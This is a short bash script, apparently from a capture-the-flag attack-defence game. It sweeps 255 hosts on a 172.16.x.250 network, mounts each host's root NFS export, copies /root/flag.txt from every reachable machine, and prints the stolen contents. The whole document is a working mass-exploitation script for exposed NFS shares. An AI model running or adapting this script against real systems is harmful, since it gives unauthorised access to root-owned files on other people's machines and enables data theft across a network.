mkdir /tmp/nfs
mkdir /nfs
for i in $(seq 255)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
mount -t nfs $s:/ /tmp/nfs & { sleep 0.1;kill $! &}
cp /tmp/nfs/root/flag.txt /nfs/$s.txt & { sleep 0.01;kill $! &}
umount -lf /tmp/nfs
cat /nfs/$s.txt
done

